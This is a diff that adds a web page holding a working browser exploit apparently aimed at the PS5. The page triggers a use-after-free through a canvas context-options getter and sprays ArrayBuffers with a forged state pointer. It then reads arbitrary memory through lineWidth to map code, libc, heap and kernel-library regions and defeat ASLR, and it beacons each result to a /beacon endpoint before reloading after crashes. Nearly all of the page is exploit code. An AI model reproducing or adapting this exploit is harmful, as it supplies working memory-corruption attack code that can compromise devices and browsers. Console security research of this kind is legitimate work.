@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V653</title></head>
+<body><pre id="out">V653 — fast PS5 address scan</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+var _imgs=[];for(var i=0;i<40;i++)_imgs.push(new Image());
+var _ix=0;
+function bk(tag,d){
+  var img=_imgs[_ix++%40];
+  img.src='/beacon/V653-'+tag+'?d='+encodeURIComponent(String(d).slice(0,800))+'&t='+Date.now();
+}
+var _b8=new ArrayBuffer(8),_f64=new Float64Array(_b8),_u32=new Uint32Array(_b8);
+var _bu;try{_bu=new BigUint64Array(_b8);}catch(e){}
+function f2h(v){_f64[0]=v;return '0x'+('00000000'+_u32[1].toString(16)).slice(-8)+('00000000'+_u32[0].toString(16)).slice(-8);}
+function f2big(v){if(_bu){_f64[0]=v;return '0x'+_bu[0].toString(16);}return f2h(v);}
+
+/*
+ * STRATEGY: Fast coarse scan, 64MB jumps across the FULL PS5 address space.
+ * Each crash takes ~5 min. Budget: 24 targets = ~2 hours (done by 4am).
+ *
+ * From ZigZag (Lua loader on 14.10):
+ *   eboot: 0x60388000 (~1.5GB)  libc: 0xCA700000 (~3.4GB)
+ *   heap:  0x310000000 (~13GB)  libkernel: 0x819B40000 (~35GB)
+ *
+ * Code segments are MOST USEFUL — we know their layout from ZigZag.
+ * If we can read from eboot or libc range, we get a CODE pointer
+ * which reveals the ASLR slide for that module.
+ *
+ * Priority order:
+ * 1. Code ranges (eboot ~0x60M, libc ~0xCA0M) — stable, known layout
+ * 2. Heap (0x310M-0x320M at 64MB steps) — fast sweep
+ * 3. libkernel (~0x819M)
+ * 4. Wide scan (low/high user space)
+ */
+
+/* Clear V650/V652 localStorage conflicts */
+try{localStorage.removeItem('v650_attempt');localStorage.removeItem('v650_result');}catch(e){}
+try{localStorage.removeItem('v652_attempt');localStorage.removeItem('v652_result');localStorage.removeItem('v652_resume');}catch(e){}
+
+var TARGETS = [
+  /* Priority 1: Code ranges — eboot area (ASLR slide is small on PS5) */
+  [0x00000000, 0x60000000, 'eboot-0x60000000'],
+  [0x00000000, 0x60400000, 'eboot-0x60400000'],
+  [0x00000000, 0x80000000, 'code-0x80000000'],
+  [0x00000000, 0xA0000000, 'code-0xA0000000'],
+
+  /* Priority 2: libc area */
+  [0x00000000, 0xC0000000, 'libc-0xC0000000'],
+  [0x00000000, 0xCA000000, 'libc-0xCA000000'],
+  [0x00000000, 0xD0000000, 'libc-0xD0000000'],
+
+  /* Priority 3: Heap — 64MB jumps across 0x300M-0x320M */
+  [0x00000003, 0x00000000, 'heap-0x300000000'],
+  [0x00000003, 0x04000000, 'heap-0x304000000'],
+  [0x00000003, 0x08000000, 'heap-0x308000000'],
+  [0x00000003, 0x0C000000, 'heap-0x30C000000'],
+  [0x00000003, 0x14000000, 'heap-0x314000000'],
+  [0x00000003, 0x18000000, 'heap-0x318000000'],
+  [0x00000003, 0x1C000000, 'heap-0x31C000000'],
+  [0x00000003, 0x20000000, 'heap-0x320000000'],
+
+  /* Priority 4: libkernel */
+  [0x00000008, 0x00000000, 'lk-0x800000000'],
+  [0x00000008, 0x10000000, 'lk-0x810000000'],
+  [0x00000008, 0x1A000000, 'lk-0x81A000000'],
+  [0x00000008, 0x20000000, 'lk-0x820000000'],
+
+  /* Priority 5: Wide scan — 512MB jumps */
+  [0x00000001, 0x00000000, 'w-0x100000000'],
+  [0x00000002, 0x00000000, 'w-0x200000000'],
+  [0x00000004, 0x00000000, 'w-0x400000000'],
+  [0x00000006, 0x00000000, 'w-0x600000000'],
+];
+
+var MAX = TARGETS.length;
+var attempt = 0;
+try { attempt = parseInt(localStorage.getItem('v653_attempt')) || 0; } catch(e) {}
+
+/* Store ALL hits for accumulation across reloads */
+var hits = '';
+try { hits = localStorage.getItem('v653_hits') || ''; } catch(e) {}
+
+bk('BOOT', 'a='+attempt+'/'+MAX+'|hits='+hits.length);
+say('Attempt ' + attempt + '/' + MAX);
+if(hits) say('Previous hits: ' + hits);
+
+if (attempt >= MAX) {
+  bk('EXHAUSTED', 'all-'+MAX+'|hits='+hits);
+  say('Exhausted. Hits: ' + (hits || 'none'));
+  setTimeout(function(){
+    try{localStorage.setItem('v653_attempt','0');}catch(e){}
+    location.reload();
+  }, 30000);
+} else {
+  var tgt = TARGETS[attempt];
+  var tgtHi = tgt[0], tgtLo = tgt[1], tgtDesc = tgt[2];
+  var tgtHex = '0x'+('00000000'+tgtHi.toString(16)).slice(-8)+('00000000'+tgtLo.toString(16)).slice(-8);
+  bk('TGT', 'n='+attempt+'|'+tgtHex+'|'+tgtDesc);
+  say('→ ' + tgtHex + ' (' + tgtDesc + ')');
+
+  /* Pre-increment for crash recovery */
+  try { localStorage.setItem('v653_attempt', String(attempt + 1)); } catch(e) {}
+
+  /* === UAF TRIGGER === */
+  var canvas = document.createElement('canvas');
+  canvas.width = 1; canvas.height = 1;
+  var innerCtx = null;
+  var uafOpts = {};
+  Object.defineProperty(uafOpts, 'alpha', {get: function() {
+    innerCtx = canvas.getContext('2d');
+    return true;
+  }});
+  canvas.getContext('bitmaprenderer', uafOpts);
+
+  if (!innerCtx) {
+    bk('FAIL', 'no-inner');
+    try{localStorage.setItem('v653_attempt',String(attempt+1));}catch(e){}
+    setTimeout(function(){location.reload();},3000);
+  } else {
+    /* Flush dealloc log */
+    for (var f = 0; f < 600; f++) new ArrayBuffer(16);
+
+    /* AB(768) spray */
+    var abs = new Array(200);
+    var dvs = new Array(200);
+    for (var s = 0; s < 200; s++) {
+      abs[s] = new ArrayBuffer(768);
+      dvs[s] = new DataView(abs[s]);
+    }
+
+    /* Forge m_stateStack in ALL ABs — point to target address */
+    for (var w = 0; w < 200; w++) {
+      dvs[w].setUint32(112, tgtLo, true);
+      dvs[w].setUint32(116, tgtHi, true);
+      dvs[w].setUint32(120, 2, true);
+      dvs[w].setUint32(124, 1, true);
+    }
+
+    /* === CRITICAL: lineWidth reads 8 bytes at target+48 === */
+    /* If unmapped → SIGSEGV → crash → reload → next attempt */
+    var lw = innerCtx.lineWidth;
+
+    /* SURVIVED! This address is MAPPED! */
+    innerCtx = null;
+    for (var c = 0; c < 200; c++) {
+      dvs[c].setFloat64(112, 0, true);
+      dvs[c].setUint32(120, 0, true);
+      dvs[c].setUint32(124, 0, true);
+    }
+
+    var lwH = f2h(lw);
+    var lwB = f2big(lw);
+
+    bk('HIT', '***'+tgtHex+'='+lwB+'***');
+    say('*** HIT: ' + tgtHex + ' → ' + lwB + ' ***');
+
+    /* Accumulate hits */
+    var hitStr = tgtHex+'='+lwB;
+    try {
+      hits = (localStorage.getItem('v653_hits')||'')+hitStr+';';
+      localStorage.setItem('v653_hits', hits);
+    } catch(e) {}
+
+    /* If value looks like a pointer (non-zero, high bits), read more offsets */
+    if (lw !== 0 && lw !== 1) {
+      /* Try miterLimit too (offset +64 in State, so target+64) */
+      /* Need a new UAF for that — too risky, move on */
+      bk('VAL', 'lw='+lw+'|hex='+lwH+'|big='+lwB+'|desc='+tgtDesc);
+    } else {
+      bk('ZERO', tgtHex+'=zero');
+    }
+
+    canvas._abs = abs;
+  }
+
+  /* Continue to next target */
+  bk('NEXT', 'reload-3s');
+  setTimeout(function(){location.reload();}, 3000);
+}
+</script>
+</body></html>
